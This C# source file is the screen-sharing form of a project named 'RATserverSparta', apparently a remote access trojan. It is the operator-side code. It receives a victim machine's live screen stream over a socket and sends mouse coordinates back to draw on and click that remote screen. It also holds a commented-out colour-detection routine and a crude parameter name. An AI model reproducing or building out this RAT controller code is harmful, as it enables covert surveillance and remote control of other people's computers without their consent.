using RATserverSparta.Client;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RATserverSparta.Tools.Screen
{
    public partial class ScreenShare : Form
    {
        private Graphics g;
        private double x, y = -1;
        private Pen pen;
        private bool isMouseMove = false;
        string SelectedColor = "black";

        int ClientResolutionX;
        int ClientResolutionY;

        int HostComputerX;
        int HostComputerY;

        private System.Net.Sockets.Socket ClientSocket;
        private Client.Client ClientClassInstance;
        private SocketSend Data;
        public ScreenShare(Client.Client ClientClassInstance, System.Net.Sockets.Socket ClientSocket)
        {
            InitializeComponent();
            this.ClientSocket = ClientSocket;
            this.ClientClassInstance = ClientClassInstance;
            this.Data = new SocketSend(ClientSocket);
            pictureBox1.MouseDown += MouseDownEvent;
            pictureBox1.MouseUp += MouseUpEvent;
            pictureBox1.MouseMove += MouseMoveEvent;
            pictureBox1.MouseClick += pictureBox1_Click;
        }
        private void ScreenShare_Load(object sender, EventArgs e)
        {
            this.TopMost = true;
            this.ClientClassInstance.screenStreamEvent += screenStream;
            this.FormClosing += CloseEvent;
            this.pen = new Pen(Color.Black, 5);
            g = pictureBox1.CreateGraphics();
            string ClientResolution = this.ClientClassInstance.ScreenResolution;

            try
            {

                Match MatchRegex(string input)
                {
                    string pattern = @"Width=(\d+),Height=(\d+)";
                    Match m = Regex.Match(input, pattern);
                    return m;
                }
                //Client resolution X,Y
                Match match = MatchRegex(ClientResolution);
                this.ClientResolutionX = int.Parse(match.Groups[1].Value);
                this.ClientResolutionY = int.Parse(match.Groups[2].Value);

                //Server resolution X,Y
                Rectangle resolution = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                Match match1 = MatchRegex(resolution.ToString());
                this.HostComputerX = int.Parse(match1.Groups[1].Value);
                this.HostComputerY = int.Parse(match1.Groups[2].Value);

            }
            catch { }

            this.Size = new Size(500, 300);
        }
        private void pictureBox1_Click(object sender, MouseEventArgs e)
        {
            if (MouseControl.Checked)
            {
                this.x = e.X;
                this.y = e.Y;

                x *= (ClientResolutionX / 500 + 1);
                y *= (ClientResolutionY / 300 + 1);

                byte[] stats = Encoding.ASCII.GetBytes(x.ToString() + "\0" + y.ToString());
                this.Data.Send(stats, 10); //Once for draw point
                this.Data.Send(stats, 22); //Once for WinApi Screen click
            }
        }
        void MouseMoveEvent(object sender, MouseEventArgs a)
        {
            if (isMouseMove)
            {
                g.DrawLine(pen, new Point(int.Parse(a.X.ToString()), int.Parse(a.Y.ToString())), a.Location);

                x *= (ClientResolutionX / 500 + 1);
                y *= (ClientResolutionY / 300 + 1);

                byte[] stats = Encoding.ASCII.GetBytes(x.ToString() + "\0" + y.ToString());
                this.Data.Send(stats, 10);

                x = a.X;
                y = a.Y;
            }
        }

        void screenStream(byte[] buffer)
        {
            this.Invoke((MethodInvoker)delegate
            {
                try
                {
                    MemoryStream imageStream = new MemoryStream(buffer);
                    Image receivedImage = Image.FromStream(imageStream);
                    pictureBox1.Image = receivedImage;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: " + ex.Message);
                }
            });
        }

        /* Color detector feature - right now causing alot lags at the screen stream
         * 
         * 
         * void screenStream(byte[] buffer)
        {
            this.Invoke((MethodInvoker)delegate
            {
                char biggerValue(int[] rgb)
                {
                    if (rgb[0] > rgb[1] && rgb[0] > rgb[2])
                        return 'r';
                    if (rgb[1] > rgb[0] && rgb[1] > rgb[2])
                        return 'g';
                    else
                        return 'b';
                }

                try
                {
                    MemoryStream imageStream = new MemoryStream(buffer);
                    Image receivedImage = Image.FromStream(imageStream);
                    pictureBox1.Image = receivedImage;

                    int r = 0, g = 0, b = 0;
                    // Check RGB values
                    Bitmap bitmap = new Bitmap(receivedImage);
                    for (int y = 0; y < bitmap.Height; y++)
                    {
                        for (int x = 0; x < bitmap.Width; x++)
                        {
                            Color pixelColor = bitmap.GetPixel(x, y);
                            int red = pixelColor.R;
                            int green = pixelColor.G;
                            int blue = pixelColor.B;
                            int[] data = { red, green, blue };
                            char charecter = biggerValue(data);
                            switch (charecter)
                            {
                                case 'r': r++; break;
                                case 'g': g++; break;
                                case 'b': b++; break;
                            }
                        }
                    }
                    int[] RGBData = { r, g, b };
                    char charecterData = biggerValue(RGBData);
                    switch (charecterData)
                    {
                        case 'r': this.label1.Text = "red"; break;
                        case 'g': this.label1.Text = "green"; break;
                        case 'b': this.label1.Text = "blue"; break;

                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: " + ex.Message);
                }
            });
        }*/





        void MouseDownEvent(object sender, MouseEventArgs a)
        {
            isMouseMove = true;
            x = a.X;
            y = a.Y;
        }

        void MouseUpEvent(object sender, MouseEventArgs a)
        {
            isMouseMove = false;
            x = -1;
            y = -1;
        }

        private void CloseEvent(object fuckingSender, EventArgs e)
        {
            this.Data.Send(Encoding.ASCII.GetBytes("\0"), 9);
        }
    }
}
